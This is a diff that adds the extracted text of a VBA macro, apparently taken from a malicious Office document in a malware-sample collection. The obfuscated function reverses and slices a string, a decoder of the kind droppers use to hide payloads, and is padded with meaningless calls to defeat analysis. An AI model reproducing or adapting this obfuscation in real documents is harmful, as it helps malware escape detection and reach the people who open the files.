@@ -1,0 +1,20 @@
+Filename     : ./macros/c034362eeabfb47e84db7f482e589d1de670072ffc905ce5b711fd1fa510dc8c
+OLE stream   : Macros/VBA/OYopaSICY
+VBA filename : OYopaSICY.bas
+----------------------------------------
+Attribute VB_Name = "OYopaSICY"
+Function ytgUBhjkgbksad(ByVal tlkfVfcrEMkf As String, QOqOjJMv, qVVhiBnnT)
+On Error Resume Next
+Call zccohPKtKnLWZfCbzpaREphAHoiF.jTGDKLObnriGktwErwJmwTTbGr.vchthEDaTFSPTnA.zsLUwkvPqYSrQAi
+Call TCTwGzABjSdwYipwzIVivWMKhRDI.MKTaWvRUBEAsJoiHwqHjUtHi.BwpJRpusQTIJXCnYiwDVqliiCkav.RTCofUzcLjPFztUWzYnU
+Call pzEJEQOGGhOzTwA.VshnvTMnPqrNM.LmaNbWzfaElVE.AGjvUQcjGjPW
+YIwqbln = QtNYAuBVcYF + StrReverse(tlkfVfcrEMkf) + iHqRdCaPK
+hbnlkNtGUHl = JKwtwcijtwFl + Mid(YIwqbln, QOqOjJMv, qVVhiBnnT) + lMjlaDjYhaY
+Call ImOcipHadkDcGwYqviHRsaEEwR.LiNbjYDnqQDPIwLDBJEicipdDTHzi.JjNpvvQIUDCKiarOwSjXCvs.XhokYQQFFIGXBTDPntoAbRwOl
+Call UoRKiNnbSNHfkEnzFZUUNfOQkJ.sKFlazjvcnuisk.AqIHIkNiLWuRboZBaUGuQ.cjjAIKJKvbjmiYHc
+Call WfjtOfhIGCmU.mpKoObbIcCVBbTh.KBuwUkPkTNBwsBIWqmpubqKfBs.dLsmMATwAsWoCaaVAacQatwKpinN
+Call qOwbplZaapwZFHiUzm.BVJEYcUjMhzhMGcKdZ.MoBuZlirVlUqsrUL.jJYzVCMsdHlTczAukaiAajTulzzsq
+ytgUBhjkgbksad = qsudd + hbnlkNtGUHl + ANrmoBwi
+Call XsoUvIRpKYzqdOVEUBYQtYzUftW.rMYnoCNHJYvwZCjFjiWzViU.XNwzsUoCliwwzJBbAOvwGbrqpuoBW.MJrYPbDOOpksKqEkFWc
+Call wGnYtvWHKzfmfPVoHataXmAFMNRB.EpRYbXGVTfTEvDQJzNvUPdidC.MGhMfiVWFIONDrPTnvZV.jjwOAVjWaKoWELzoHAojZ
+End Function
